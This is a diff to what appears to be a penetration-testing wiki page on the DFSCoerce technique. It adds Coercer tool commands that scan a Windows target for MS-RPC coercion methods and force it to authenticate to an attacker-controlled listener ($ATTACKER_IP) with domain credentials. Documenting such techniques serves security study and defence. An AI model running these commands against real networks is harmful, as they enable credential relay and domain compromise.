@@ -13,6 +13,16 @@ In mid-2022, [Filip Dragovic](https://twitter.com/filip_dragovic) demonstrated t
 
 ## Practice
 
+[Coercer](https://github.com/p0dalirius/Coercer) (Python) can also be used to trigger all available MS-RPC coercions (including this one) in a single tool, with or without target filtering.
+
+```bash
+# Scan for available coercion methods
+coercer scan -t $TARGET -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+
+# Coerce authentication to attacker listener
+coercer coerce -t $TARGET -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+```
+
 The following Python proof-of-concept ([https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)) implements the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` methods.
 
 ```bash
